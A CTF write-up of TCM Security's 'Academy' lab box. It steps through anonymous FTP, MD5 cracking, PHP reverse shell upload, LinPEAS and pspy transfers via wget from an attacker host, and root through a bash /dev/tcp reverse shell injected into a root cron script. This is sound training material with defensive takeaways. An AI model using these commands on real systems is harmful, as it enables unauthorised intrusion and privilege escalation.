# Academy Box — CTF Writeup

**Platform:** TCM Security   
**Full Walkthrough (with screenshots):** [Read on Medium](https://medium.com/@olamideoyek/academy-box-ctf-walkthrough-b535a08e3f0b)

---

## Overview

A Linux-based machine combining credential harvesting via anonymous FTP, MD5 hash cracking, unrestricted PHP file upload exploitation, and privilege escalation via a writable root-owned cron job. Process monitoring with `pspy` was used to confirm cron execution timing before injecting a reverse shell into the scheduled script.

---

## Attack Chain Summary

```
Host Discovery (ip a) → Nmap Scan → FTP Anonymous Login → note.txt Review
→ MD5 Hash Crack (Hashcat) → Gobuster Directory Bust → Academy Login
→ PHP Reverse Shell Upload → www-data Shell
→ LinPEAS → Config File Credential Leak → SSH as grimmie
→ pspy → Writable Cron Job (backup.sh) → Root Shell → Flag
```

---

## Step 1 — Host Discovery

```bash
ip a
```

Used after setting up the Academy VM to identify the machine's assigned IP address.

---

## Step 2 — Port Scanning & Enumeration

```bash
nmap <target-ip>
```

**Open Ports:**

| Port | Service | Details |
|------|---------|---------|
| 21 | FTP | Anonymous login allowed — `note.txt` present |
| 22 | SSH | OpenSSH — noted, not exploited directly |
| 80 | HTTP | Apache 2 on Debian — default "It Works" page |

---

## Step 3 — FTP Enumeration & Credential Discovery

Anonymous FTP login was confirmed via Nmap. Connected and retrieved `note.txt`:

```bash
ftp <target-ip>
# Username: anonymous | Password: (blank)
ls
get note.txt
```

**Finding:** `note.txt` revealed that a `StudentRegno` is used as the login credential. Cross-referencing the email against database entries (with help from `jdelta`) yielded:

| Field | Value |
|-------|-------|
| Username | `10201321` |
| Password (hash) | `cd73502828457d15655bbd7a63fb0bc8` |

---

## Step 4 — Hash Cracking

### Identify the Hash
```bash
hash-identifier
# Result: MD5
```

### Crack with Hashcat
```bash
hashcat -m 0 cd73502828457d15655bbd7a63fb0bc8 /usr/share/wordlists/rockyou.txt
```

**Result:** `student`

**Credentials obtained:** `10201321` / `student`

---

## Step 5 — Web Enumeration (Port 80)

The root page returned the default Apache2 landing page. Directory busting was performed with **Gobuster**:

```bash
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirb/common.txt
```

**Directories Found:**

| Path | Content |
|------|---------|
| `/academy` | Login page |
| `/phpmyadmin` | phpMyAdmin panel |
| `/server-status` | Apache server status |

---

## Step 6 — PHP Reverse Shell Upload (Foothold)

### Login to Academy
Navigated to `http://<target-ip>/academy` and logged in with `10201321` / `student`.

### Identify Upload Vulnerability
Under **My Profile → Student Registration**, a profile photo upload field was identified. This was targeted for a malicious PHP file upload.

### Configure Reverse Shell
Downloaded the PentestMonkey PHP reverse shell and edited it:

```bash
nano php-reverse-shell.php
# Set: $ip = '<attacker-ip>';
# Set: $port = <listening-port>;
```

### Start Netcat Listener
```bash
nc -nlvp <port>
```

| Flag | Description |
|------|-------------|
| `-n` | No DNS resolution — numeric IPs only |
| `-l` | Listen mode |
| `-v` | Verbose output |
| `-p` | Specify port |

### Upload & Trigger
Uploaded the PHP file as the profile photo and clicked **Update**. The server executed the file, initiating a connection back to the listener.

**Shell obtained as:** `www-data`

---

## Step 7 — Post-Exploitation Enumeration (LinPEAS)

### Transfer LinPEAS to Target
On the attacking machine, start a Python web server in the LinPEAS directory:

```bash
python3 -m http.server 80
```

On the target machine:

```bash
cd /tmp
wget http://<attacker-ip>/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

**Key Findings:**

| Finding | Detail |
|---------|--------|
| Cron job | `/home/grimmie/backup.sh` — runs every minute as root |
| Config file | A `.php` config file contained a plaintext password string |

---

## Step 8 — SSH Access as `grimmie`

The plaintext password from the config file was used to SSH in as `grimmie`:

```bash
ssh grimmie@<target-ip>
```

Checked `/etc/shadow` and `/etc/passwd` — no further useful information found at this stage.

---

## Step 9 — Cron Job Verification (pspy)

`pspy` was used to confirm the cron job was actively running without requiring root privileges.

### Transfer pspy to Target
```bash
# On attacker: (already hosting python web server)
# On target:
wget http://<attacker-ip>/pspy64
chmod +x pspy64
./pspy64
```

**Finding:** `backup.sh` confirmed executing approximately once per minute as root.

---

## Step 10 — Privilege Escalation (Writable Cron Job)

### Start New Netcat Listener
```bash
nc -nlvp 8080
```

### Inject Reverse Shell into backup.sh
As `grimmie`, overwrite the cron script contents with a Bash reverse shell one-liner:

```bash
nano /home/grimmie/backup.sh
# Replace contents with:
bash -i >& /dev/tcp/<attacker-ip>/8080 0>&1
```

When the cron job fires (~1 minute), it executes `backup.sh` as root — initiating a root-level reverse shell connection back to the listener.

**Shell obtained as:** `root`

### Capture the Flag
```bash
ls -a /root
cat /root/flag.txt
```

**Result: Root access achieved. Flag captured.**

---

## Credentials Summary

| Source | Username | Password |
|--------|----------|---------|
| FTP `note.txt` + hash crack | `10201321` | `student` |
| PHP config file | `grimmie` | (from config) |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `ip a` | Host IP discovery |
| `nmap` | Port scanning & service detection |
| `gobuster` | Directory enumeration |
| `hash-identifier` | Hash type identification |
| `hashcat` | MD5 hash cracking |
| PentestMonkey PHP shell | Reverse shell payload |
| `nc` (Netcat) | Listener for reverse connections |
| `python3 -m http.server` | File transfer web server |
| `wget` | File transfer to target |
| LinPEAS | Automated privilege escalation enumeration |
| `pspy` | Real-time process monitoring without root |

---

## Key Takeaways

- **Anonymous FTP** should always be tested — sensitive files like credential notes are a common finding.
- **MD5 hashes** are weak and trivially crackable with standard wordlists; password storage must use modern hashing algorithms (bcrypt, Argon2).
- **Unrestricted file upload** is a critical vulnerability — server-side validation of file type and content is essential.
- **Plaintext credentials in config files** are a significant risk; secrets should be stored in environment variables or secrets managers.
- **Writable cron jobs running as root** are a straightforward and severe privilege escalation vector — always audit cron job permissions.
- **`pspy`** is a practical tool for confirming scheduled task execution without needing elevated privileges.

---

> ⚠️ **Disclaimer:** This walkthrough was performed in an isolated lab environment for educational purposes only.
